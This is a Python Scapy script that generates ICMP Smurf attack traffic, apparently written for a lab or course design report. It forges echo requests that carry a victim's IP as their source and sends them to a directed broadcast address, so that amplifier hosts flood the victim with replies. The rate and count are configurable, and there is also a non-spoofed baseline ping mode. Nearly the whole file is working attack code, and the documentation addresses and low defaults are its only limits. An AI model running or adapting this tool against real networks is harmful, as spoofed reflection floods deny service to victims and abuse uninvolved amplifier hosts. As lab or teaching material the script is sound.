#!/usr/bin/env python3
"""
ICMP Smurf Attack — Traffic Generator
  Phase 1: Source-address spoofing   (src = victim IP)
  Phase 2: Directed-broadcast dest   (dst = amplifier broadcast address)
  Phase 3: Reflection                (amplifier hosts reply to victim)
  Phase 4: Repetition               (controlled rate, configurable count)
"""

import argparse
import sys
import time
from datetime import datetime

try:
    from scapy.all import IP, ICMP, Raw, send, conf
except ImportError:
    print("ERROR: Scapy is not installed. Run: pip install scapy")
    sys.exit(1)


# ── Defaults (matching the Design Report §4 addressing) ────────────────────
DEFAULT_VICTIM_IP    = "198.51.100.10"
DEFAULT_BROADCAST_IP = "203.0.113.255"
DEFAULT_PAYLOAD_SIZE = 64          # bytes of ICMP data
DEFAULT_RATE         = 1           # packets per second
DEFAULT_COUNT        = 10          # total packets to send
DEFAULT_TTL          = 64


def build_smurf_packet(victim_ip, broadcast_ip, payload_size, seq_num, ttl):
    """
    Construct a single spoofed ICMP Echo Request packet.

    IPv4 Header:
        Source Address:      victim_ip      (SPOOFED)
        Destination Address: broadcast_ip   (DIRECTED BROADCAST)
        Protocol:            1 (ICMP)
        TTL:                 configurable

    ICMP Header:
        Type: 8 (Echo Request)
        Code: 0
        Identifier: 0x5MF (fixed for easy filtering)
        Sequence Number: incrementing

    Payload:
        Variable-length padding (configurable via --payload-size)
    """
    ip_layer = IP(
        src=victim_ip,       # Spoofed source — the victim
        dst=broadcast_ip,    # Directed broadcast address
        ttl=ttl,
        proto=1              # ICMP
    )

    icmp_layer = ICMP(
        type=8,              # Echo Request
        code=0,
        id=0x534D,           # "SM" in hex — easy to identify in captures
        seq=seq_num
    )

    # Payload padding (§7.2: larger payloads increase bytes per packet)
    payload = Raw(load=b"SMURF" * (payload_size // 5 + 1))
    payload = Raw(load=bytes(payload)[:payload_size])

    return ip_layer / icmp_layer / payload


def run_attack(args):
    """Execute the Smurf attack traffic generation."""

    print("=" * 70)
    print("  ICMP SMURF ATTACK — TRAFFIC GENERATOR")
    print("=" * 70)
    print(f"  Victim IP (spoofed src) : {args.victim_ip}")
    print(f"  Broadcast IP (dst)      : {args.broadcast_ip}")
    print(f"  Payload size            : {args.payload_size} bytes")
    print(f"  Rate                    : {args.rate} pkt/s")
    print(f"  Count                   : {args.count} packets")
    print(f"  TTL                     : {args.ttl}")
    print("=" * 70)
    print()

    # Disable Scapy verbosity for cleaner output
    conf.verb = 0

    interval = 1.0 / args.rate
    start_time = datetime.now()

    print(f"[{start_time.strftime('%H:%M:%S')}] Starting attack...")
    print()

    for i in range(1, args.count + 1):
        pkt = build_smurf_packet(
            victim_ip=args.victim_ip,
            broadcast_ip=args.broadcast_ip,
            payload_size=args.payload_size,
            seq_num=i,
            ttl=args.ttl
        )

        send(pkt)

        total_bytes = len(pkt)
        print(
            f"  [{i:4d}/{args.count}] "
            f"Sent Echo Request  "
            f"src={args.victim_ip} → dst={args.broadcast_ip}  "
            f"seq={i}  size={total_bytes}B"
        )

        if i < args.count:
            time.sleep(interval)

    end_time = datetime.now()
    elapsed = (end_time - start_time).total_seconds()

    print()
    print("=" * 70)
    print(f"  Attack complete.")
    print(f"  Packets sent   : {args.count}")
    print(f"  Elapsed time   : {elapsed:.2f}s")
    print(f"  Effective rate  : {args.count / elapsed:.2f} pkt/s")
    print(f"  Expected replies: up to {args.count} × N  (N = amplifier hosts)")
    print("=" * 70)


def run_normal_ping(args):
    """Send normal (non-spoofed) pings for baseline comparison (§6.1)."""

    print("=" * 70)
    print("  NORMAL ICMP ECHO — BASELINE TEST")
    print("=" * 70)
    print(f"  Destination    : {args.broadcast_ip}")
    print(f"  Count          : {args.count}")
    print("=" * 70)
    print()

    conf.verb = 0

    for i in range(1, args.count + 1):
        # Normal ping — no source spoofing
        pkt = IP(dst=args.broadcast_ip) / ICMP(type=8, code=0, id=0x4E4F, seq=i)
        send(pkt)
        print(f"  [{i:4d}/{args.count}] Sent normal Echo Request → {args.broadcast_ip}  seq={i}")
        if i < args.count:
            time.sleep(1.0 / args.rate)

    print()
    print("  Baseline test complete.")
    print("=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="ICMP Smurf Attack Traffic Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run default Smurf attack (10 packets at 1/s)
  python3 smurf_attack.py

  # Higher rate with more packets
  python3 smurf_attack.py --rate 5 --count 50

  # Normal baseline ping (no spoofing)
  python3 smurf_attack.py --mode baseline

  # Custom victim and broadcast addresses
  python3 smurf_attack.py --victim-ip 198.51.100.10 --broadcast-ip 203.0.113.255
        """
    )

    parser.add_argument(
        "--mode", choices=["attack", "baseline"], default="attack",
        help="Mode: 'attack' = spoofed Smurf, 'baseline' = normal ping (default: attack)"
    )
    parser.add_argument(
        "--victim-ip", default=DEFAULT_VICTIM_IP,
        help=f"Victim IP address to spoof as source (default: {DEFAULT_VICTIM_IP})"
    )
    parser.add_argument(
        "--broadcast-ip", default=DEFAULT_BROADCAST_IP,
        help=f"Directed broadcast address of amplifier network (default: {DEFAULT_BROADCAST_IP})"
    )
    parser.add_argument(
        "--payload-size", type=int, default=DEFAULT_PAYLOAD_SIZE,
        help=f"ICMP payload size in bytes (default: {DEFAULT_PAYLOAD_SIZE})"
    )
    parser.add_argument(
        "--rate", type=float, default=DEFAULT_RATE,
        help=f"Packets per second (default: {DEFAULT_RATE})"
    )
    parser.add_argument(
        "--count", type=int, default=DEFAULT_COUNT,
        help=f"Total number of packets to send (default: {DEFAULT_COUNT})"
    )
    parser.add_argument(
        "--ttl", type=int, default=DEFAULT_TTL,
        help=f"IP TTL value (default: {DEFAULT_TTL})"
    )

    args = parser.parse_args()

    if args.mode == "baseline":
        run_normal_ping(args)
    else:
        run_attack(args)


if __name__ == "__main__":
    main()
